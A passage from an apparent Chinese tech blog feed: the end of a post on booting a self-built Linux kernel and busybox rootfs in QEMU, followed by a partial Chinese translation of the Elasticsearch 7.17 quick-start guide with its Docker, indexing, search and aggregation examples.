<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># rm -rf rootfs.ext3</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># rm -rf fs</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32</span></span><br><span class="line">记录了<span class="number">32</span>+<span class="number">0</span> 的读入</span><br><span class="line">记录了<span class="number">32</span>+<span class="number">0</span> 的写出</span><br><span class="line"><span class="number">33554432</span> bytes (<span class="number">34</span> MB, <span class="number">32</span> MiB) copied, <span class="number">0.0537795</span> s, <span class="number">624</span> MB/s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># mkfs.ext3 rootfs.ext3</span></span><br><span class="line">mke2fs <span class="number">1.44</span><span class="number">.5</span> (<span class="number">15</span>-<span class="built_in">Dec</span><span class="number">-2018</span>)</span><br><span class="line">Discarding device blocks: done</span><br><span class="line">Creating filesystem <span class="keyword">with</span> <span class="number">32768</span> <span class="number">1</span>k blocks <span class="literal">and</span> <span class="number">8192</span> inodes</span><br><span class="line">Filesystem UUID: <span class="number">85</span>ccc327<span class="number">-919</span>a<span class="number">-4246</span>-ae60-a085a09d6cdb</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># mkdir fs</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># mount -o loop rootfs.ext3 ./fs</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># cp -rf ./_install/* ./fs</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># umount ./fs</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># gzip --best -c rootfs.ext3 &gt; rootfs.img.gz</span></span><br></pre></td></tr></table></figure>



<h3 id="4-6-启动内核"><a href="#4-6-启动内核" class="headerlink" title="4.6 启动内核"></a>4.6 启动内核</h3><p>通过qemu模拟器启动我们自己编译的内核</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install qemu-<span class="keyword">system</span>-x86</span><br></pre></td></tr></table></figure>



<p>启动自己编译的linux</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -kernel .<span class="regexp">/linux-4.9.229/</span>arch<span class="regexp">/x86_64/</span>boot/bzImage  \</span><br><span class="line">  -initrd .<span class="regexp">/busybox-1.30.1/</span>rootfs.img.gz   \</span><br><span class="line">  -<span class="keyword">append</span> <span class="string">&quot;root=/dev/ram init=/linuxrc console=ttyS0&quot;</span>  \</span><br><span class="line">  -nographic \</span><br><span class="line">  -serial mon:stdio</span><br></pre></td></tr></table></figure>



<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">Please press Enter <span class="keyword">to</span> activate <span class="built_in">this</span> <span class="built_in">console</span>.</span><br><span class="line">/ <span class="comment"># uname -a</span></span><br><span class="line">Linux (none) <span class="number">4.9</span>.<span class="number">229</span> <span class="comment">#1 SMP Wed Aug 24 21:23:59 CST 2022 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>



<p><strong>退出</strong></p>
<p>exit</p>
<p>control + a </p>
<p>x</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Elastic7.17文档</title>
    <url>/Elastic7-17%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<p>Elastic7.17官方文档随意翻译，自己看。<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.17/elasticsearch-intro.html">文档链接</a></p>
<span id="more"></span>

<h2 id="什么是Elasticsearch"><a href="#什么是Elasticsearch" class="headerlink" title="什么是Elasticsearch"></a>什么是Elasticsearch</h2><p>Elasticsearch是Elastic Stack核心的分布式搜索和分析引擎。Logstash和Beats帮助您收集、聚合和丰富数据，并将其存储在Elasticsearch中。Kibana使您能够交互式地探索、可视化和分享你对数据的洞察，并管理和监控整个堆栈。Elasticsearch是索引、搜索和分析的魔力所在。</p>
<p>Elasticsearch提供了几乎实时的搜索和分析功能，适用于各种类型的数据。无论是结构化或者非结构化的文本、数据、地理空间数据，Elasticsearch可以高效的的存储和索引，以支持开始搜索。不止于简单的数据检索，还可以聚合信息以发现数据中的趋势和模式。随着数据和查询量的增长，Easticsearch的分布式特性使得部署可以无缝地随之扩展。</p>
<p>虽然并非每个问题都是搜索问题，但Elasticsearch提供了速度和灵活性，可以处理各种用例中的数据</p>
<p>例如：</p>
<ul>
<li>在应用程序或网站中添加一个搜索框</li>
<li>存储和分析日志、指标和安全事件数据</li>
<li>使用机器学习技术，实时自动建模您的数据行为</li>
<li>使用Elasticsearch作为存储引擎来自动化业务工作流程</li>
<li>使用Elasticssearch作为地理信息系统，管理、整活和分析空间信息</li>
<li>使用Elasticsearch作为生物信息学研究工具来存储和处理基因数据</li>
</ul>
<p>我们对人们使用搜索的新颖方式感到不断惊讶。但无论你的使用方式与这些是否类似，或者正在使用Easticsearch处理新的问题，在使用Elasticsearch中处理数据、文档和索引的方式是相同的。</p>
<h2 id="7-17有什么新内容？"><a href="#7-17有什么新内容？" class="headerlink" title="7.17有什么新内容？"></a>7.17有什么新内容？</h2><p>Elasticsearch7.17是7.17Elastic Stach的兼容版本，没有任何重大的增强功能。</p>
<h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><p>这个指南帮助初学者学习怎样：</p>
<ul>
<li><p>在测试环境中安装和运行Elasticsearch</p>
</li>
<li><p>向Elasticsearch添加数据</p>
</li>
<li><p>搜索和排序数据</p>
</li>
<li><p>在搜索过程中从非结构化内容中提取字段</p>
</li>
</ul>
<h3 id="运行-Elasticsearch"><a href="#运行-Elasticsearch" class="headerlink" title="运行 Elasticsearch"></a>运行 Elasticsearch</h3><p>设置Elasticsearch的最简单方法是在Elastic Cloud上创建一个托管部署的Elasticsearch服务。如果您更喜欢管理自己的测试环境，您可以使用Docker安装和运行Elasticsearch。</p>
<p>Elasticsearch Service</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span> a free trial.</span><br><span class="line"><span class="keyword">Log</span> <span class="keyword">into</span> Elastic Cloud.</span><br><span class="line">Click <span class="keyword">Create</span> deployment.</span><br><span class="line">Give your deployment a <span class="type">name</span>.</span><br><span class="line">Click <span class="keyword">Create</span> deployment <span class="keyword">and</span> download the <span class="keyword">password</span> <span class="keyword">for</span> the elastic <span class="keyword">user</span>.</span><br><span class="line">Click <span class="keyword">Continue</span> <span class="keyword">to</span> <span class="keyword">open</span> Kibana.</span><br><span class="line">Click Explore <span class="keyword">on</span> my own.</span><br></pre></td></tr></table></figure>

<p>Self-managed</p>
<blockquote>
<p><strong>Install and run Elasticsearch</strong></p>
<ol>
<li><p>Install and start <a href="https://www.docker.com/products/docker-desktop">Docker Desktop</a>.</p>
</li>
<li><p>Run:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker network create elastic</span><br><span class="line">docker pull docker.elastic.co/elasticsearch/elasticsearch:7.17.10</span><br><span class="line">docker run --name es01-test --net elastic -p 127.0.0.1:9200:9200 -p 127.0.0.1:9300:9300 -e <span class="string">&quot;discovery.type=single-node&quot;</span> docker.elastic.co/elasticsearch/elasticsearch:7.17.10</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>Install and run Kibana</strong></p>
<p>To analyze, visualize, and manage Elasticsearch data using an intuitive UI, install Kibana.</p>
<ol>
<li><p>In a new terminal session, run:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker.elastic.co/kibana/kibana:7.17.10</span><br><span class="line">docker run --name kib01-test --net elastic -p 127.0.0.1:5601:5601 -e &quot;ELASTICSEARCH_HOSTS=http://es01-test:9200&quot; docker.elastic.co/kibana/kibana:7.17.10</span><br></pre></td></tr></table></figure></li>
<li><p>To access Kibana, go to <a href="http://localhost:5601/">http://localhost:5601</a></p>
</li>
</ol>
</blockquote>
<h3 id="发送请求到Elasticsearch"><a href="#发送请求到Elasticsearch" class="headerlink" title="发送请求到Elasticsearch"></a>发送请求到Elasticsearch</h3><p>您可以使用REST API将数据和其他请求发送到Elasticsearch。这是的您可以使用发送HTTP请求的任何客户端与Elasticsearch进行交互，例如curl。您还可以使用Kibana的控制台向Elasticsearch发送请求。</p>
<blockquote>
<p><strong>Use Kibana 使用Kibana</strong></p>
<ol>
<li><p>Open Kibana’s main menu and go to <strong>Dev Tools &gt; Console</strong>.<br>打开Kibana的主菜单，然后进入Dev Tools &gt; Console。</p>
<p><img src="https://www.elastic.co/guide/en/elasticsearch/reference/7.17/images/kibana-console.png" alt="Kibana Console"></p>
</li>
<li><p>Run the following example API request in the console:<br>在控制台中运行以下示例API请求：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">GET /</span><br></pre></td></tr></table></figure>

<p>Copy as curl 复制为curl<a href="http://localhost:5601/app/kibana#/dev_tools/console?load_from=https://www.elastic.co/guide/en/elasticsearch/reference/7.17/snippets/2.console">View in Console<br>在控制台中查看</a> </p>
</li>
</ol>
<p><strong>Use curl 使用curl</strong></p>
<p>To submit an example API request, run the following curl command in a new terminal session.<br>要提交一个示例API请求，请在新的终端会话中运行以下curl命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -X GET http://localhost:9200/</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><p>您可以将数据以JSON对象的形式添加到Elasticsearch中，这些对象被称为文档。Elasticsearch会讲这些文档存储在可搜索的索引中。</p>
<p>对于事件序列数据，例如日志和指标，通常将文档添加到由多个自动生成的后备索引组成的数据流中。</p>
<p>一个数据流需要一个与其名称匹配的索引模版。Elasticsearch使用该模板来配置数据流的后备索引。发送到数据流的文档必须具有一个<code>@timestamp</code>字段</p>
<h3 id="添加一个单独文档"><a href="#添加一个单独文档" class="headerlink" title="添加一个单独文档"></a>添加一个单独文档</h3><p>将以下索引请求提交到<code>logs-my_app-default</code>数据流中，以添加单个日志条目。由于<code>logs-my_app-default</code>不存在，该请求会自动使用内置的<code>logs-*-*</code>索引模板创建它。</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">POST logs-my<span class="number">_</span>app-<span class="keyword">default</span>/<span class="number">_</span><span class="meta">doc</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@timestamp&quot;</span>: <span class="string">&quot;2099-05-06T16:21:15.000Z&quot;</span>,</span><br><span class="line">  <span class="string">&quot;event&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;original&quot;</span>: <span class="string">&quot;192.0.2.42 - - [06/May/2099:16:21:15 +0000] \&quot;</span>GET /images/bg.jpg HTTP/<span class="number">1.0</span>\<span class="string">&quot; 200 24736&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>响应包括Elasticsearch为文档生成的元数据</p>
<ul>
<li>包含文档的后端_index。Elasticsearch会自动生成后端索引的名称。</li>
<li>索引中文档独有的<code>_id</code>。</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;_index&quot;</span>: <span class="string">&quot;.ds-logs-my_app-default-2099-05-06-000001&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_type&quot;</span>: <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_id&quot;</span>: <span class="string">&quot;gl5MJXMBMk1dGnErnBW8&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_version&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;result&quot;</span>: <span class="string">&quot;created&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_shards&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;total&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;successful&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;failed&quot;</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;_seq_no&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;_primary_term&quot;</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="添加多个文档"><a href="#添加多个文档" class="headerlink" title="添加多个文档"></a>添加多个文档</h3><p>使用<font color="red"><code>_bulk</code></font>端点在一个请求中添加多个文档。批量数据必须是以换行符分割的JSON(NDJSON)。每行必须以换行符(<code>\n</code>)结尾，包括最后一行。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">PUT logs-my_app-<span class="keyword">default</span>/_bulk</span><br><span class="line">&#123; &quot;create&quot;: &#123; &#125; &#125;</span><br><span class="line">&#123; &quot;@timestamp&quot;: &quot;2099-05-07T16:24:32.000Z&quot;, &quot;event&quot;: &#123; &quot;original&quot;: &quot;192.0.2.242 - - [07/May/2020:16:24:32 -0500] \&quot;<span class="keyword">GET</span> /images/hm_nbg.jpg HTTP/<span class="number">1.0</span>\&quot; 304 0&quot; &#125; &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &#125; &#125;</span><br><span class="line">&#123; &quot;@timestamp&quot;: &quot;2099-05-08T16:25:42.000Z&quot;, &quot;event&quot;: &#123; &quot;original&quot;: &quot;192.0.2.255 - - [08/May/2099:16:25:42 +0000] \&quot;<span class="keyword">GET</span> /favicon.ico HTTP/<span class="number">1.0</span>\&quot; 200 3638&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>





<h3 id="搜索数据"><a href="#搜索数据" class="headerlink" title="搜索数据"></a>搜索数据</h3><p>索引文档可在几乎实时中进行搜索。以下搜索匹配 <code>logs-my_app-default</code> 中的所有日志条目，并按 <code>@timestamp</code>降序排序。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> logs-my_app-<span class="keyword">default</span>/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match_all&quot;: &#123; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;@timestamp&quot;: &quot;desc&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认情况下，响应的<code>hits</code>部分包含与搜索匹配的前10个文档。每个命中的 <code>_source</code>包含在索引期间提交的原始JSON对象。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;took&quot;</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">&quot;timed_out&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;_shards&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;total&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;successful&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;skipped&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;failed&quot;</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;hits&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;total&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;value&quot;</span>: <span class="number">3</span>,</span><br><span class="line">      <span class="attr">&quot;relation&quot;</span>: <span class="string">&quot;eq&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;max_score&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">&quot;hits&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;_index&quot;</span>: <span class="string">&quot;.ds-logs-my_app-default-2099-05-06-000001&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;_type&quot;</span>: <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;_id&quot;</span>: <span class="string">&quot;PdjWongB9KPnaVm2IyaL&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;_score&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">&quot;_source&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;@timestamp&quot;</span>: <span class="string">&quot;2099-05-08T16:25:42.000Z&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;event&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;original&quot;</span>: <span class="string">&quot;192.0.2.255 - - [08/May/2099:16:25:42 +0000] \&quot;GET /favicon.ico HTTP/1.0\&quot; 200 3638&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">          <span class="number">4081940742000</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      ...</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="获取特定字段"><a href="#获取特定字段" class="headerlink" title="获取特定字段"></a>获取特定字段</h3><p>对于大型文档来说，解析整个_source不是很方便。要将其从响应中排除，请将 <code>_source</code> 参数设置为 <code>false</code> 。相反，使用 <code>fields</code> 参数来检索您想要的字段。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> logs-my_app-<span class="keyword">default</span>/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match_all&quot;: &#123; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;fields&quot;: [</span><br><span class="line">    &quot;@timestamp&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;_source&quot;: <span class="keyword">false</span>,</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;@timestamp&quot;: &quot;desc&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>响应包含每个命中的<code>fields</code>作为一个扁平数组。</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">&quot;hits&quot;</span>: &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&quot;hits&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;_index&quot;</span>: <span class="string">&quot;.ds-logs-my_app-default-2099-05-06-000001&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_type&quot;</span>: <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_id&quot;</span>: <span class="string">&quot;PdjWongB9KPnaVm2IyaL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_score&quot;</span>: null,</span><br><span class="line">        <span class="string">&quot;fields&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;@timestamp&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;2099-05-08T16:25:42.000Z&quot;</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;sort&quot;</span>: [</span><br><span class="line">          <span class="number">4081940742000</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      ...</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="搜索日期范围"><a href="#搜索日期范围" class="headerlink" title="搜索日期范围"></a>搜索日期范围</h3><p>要在特定的时间范围或IP范围内进行搜索，请使用 <code>range</code> 查询。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">GET logs-my_app-default/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;2099-05-05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lt&quot;</span>: <span class="string">&quot;2099-05-08&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;fields&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;@timestamp&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;_source&quot;</span>: false,</span><br><span class="line">  <span class="string">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: <span class="string">&quot;desc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>您可以使用日期计算来定义相对时间范围。以下查询搜索过去一天的数据，这将不会匹配 <code>logs-my_app-default</code> 中的任何日志条目。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">GET logs-my_app-default/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;now-1d/d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lt&quot;</span>: <span class="string">&quot;now/d&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;fields&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;@timestamp&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;_source&quot;</span>: false,</span><br><span class="line">  <span class="string">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: <span class="string">&quot;desc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="从非结构化内容中提取字段"><a href="#从非结构化内容中提取字段" class="headerlink" title="从非结构化内容中提取字段"></a>从非结构化内容中提取字段</h3><p>在搜索过程中，您可以从非结构化内容（例如日志消息）中提取运行时字段。</p>
<p>在以下搜索来提取<code>event.original</code>中的<code>source.ip</code>运行时字段。要将其包含在响应中，请将<code>source.ip</code>添加到<code>fields</code>参数中。</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">GET logs-my<span class="number">_</span>app-<span class="keyword">default</span>/<span class="number">_</span>search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;runtime_mappings&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;source.ip&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">      <span class="string">&quot;script&quot;</span>: <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        String sourceip=grok(&#x27;%&#123;IPORHOST:sourceip&#125; .*&#x27;).extract(doc[ &quot;event.original&quot; ].value)?.sourceip;</span></span><br><span class="line"><span class="string">        if (sourceip != null) emit(sourceip);</span></span><br><span class="line"><span class="string">      &quot;&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;2099-05-05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lt&quot;</span>: <span class="string">&quot;2099-05-08&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;fields&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;@timestamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;source.ip&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;_source&quot;</span>: false,</span><br><span class="line">  <span class="string">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: <span class="string">&quot;desc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="合并查询"><a href="#合并查询" class="headerlink" title="合并查询"></a>合并查询</h3><p>您可以使用<code>bool</code>查询来组合多个查询。以下搜索组合了两个<code>range</code>查询：一个在<code>@timestamp</code> 上，一个在 <code>source.ip</code> 运行时字段上。</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">GET logs-my<span class="number">_</span>app-<span class="keyword">default</span>/<span class="number">_</span>search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;runtime_mappings&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;source.ip&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">      <span class="string">&quot;script&quot;</span>: <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        String sourceip=grok(&#x27;%&#123;IPORHOST:sourceip&#125; .*&#x27;).extract(doc[ &quot;event.original&quot; ].value)?.sourceip;</span></span><br><span class="line"><span class="string">        if (sourceip != null) emit(sourceip);</span></span><br><span class="line"><span class="string">      &quot;&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;filter&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@timestamp&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;2099-05-05&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lt&quot;</span>: <span class="string">&quot;2099-05-08&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;source.ip&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;192.0.2.0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lte&quot;</span>: <span class="string">&quot;192.0.2.240&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;fields&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;@timestamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;source.ip&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;_source&quot;</span>: false,</span><br><span class="line">  <span class="string">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: <span class="string">&quot;desc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="聚合数据"><a href="#聚合数据" class="headerlink" title="聚合数据"></a>聚合数据</h3><p>使用聚合功能将数据汇总为指标，统计数据或其他分析结果。</p>
<p>以下搜索使用聚合来计算<code>average_response_size</code>，使用<code>http.response.body.bytes</code>运行时字段。聚合仅在与<code>query</code>匹配的文档上运行。</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">GET logs-my<span class="number">_</span>app-<span class="keyword">default</span>/<span class="number">_</span>search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;runtime_mappings&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;http.response.body.bytes&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;long&quot;</span>,</span><br><span class="line">      <span class="string">&quot;script&quot;</span>: <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        String bytes=grok(&#x27;%&#123;COMMONAPACHELOG&#125;&#x27;).extract(doc[ &quot;event.original&quot; ].value)?.bytes;</span></span><br><span class="line"><span class="string">        if (bytes != null) emit(Integer.parseInt(bytes));</span></span><br><span class="line"><span class="string">      &quot;&quot;&quot;</span></span><br><span 